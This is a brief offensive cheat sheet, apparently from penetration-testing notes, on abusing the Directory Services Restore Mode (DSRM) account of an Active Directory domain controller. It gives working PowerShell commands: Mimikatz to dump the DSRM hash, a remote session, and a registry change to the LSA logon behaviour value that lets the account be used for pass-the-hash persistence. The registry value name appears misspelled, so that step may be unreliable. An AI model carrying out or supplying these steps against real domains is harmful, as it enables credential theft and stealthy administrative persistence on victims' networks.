**WHAT IS THIS?:**

Every DC has a local Administrator account, and this account has the DSRM password which is a SafeBackupPassword. We can get this and then PTH (Pass-The-Hash) its NTLM hash to get local Administrator access to DC!

---

- Dump DSRM password (needs DA privs):
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <DC's Name>
```
- This is a local account, so we can PTH and authenticate!
- BUT we need to alter the behaviour of the DSRM account before PTH
- Connect on DC:
```powershell
Enter-PSSession -ComputerName <DC's Name>
```
- Alter the Logon behaviour on registry:
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose
```
- If the property already exists:
```powershell
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```
- Then just PTH to get local admin access on DC!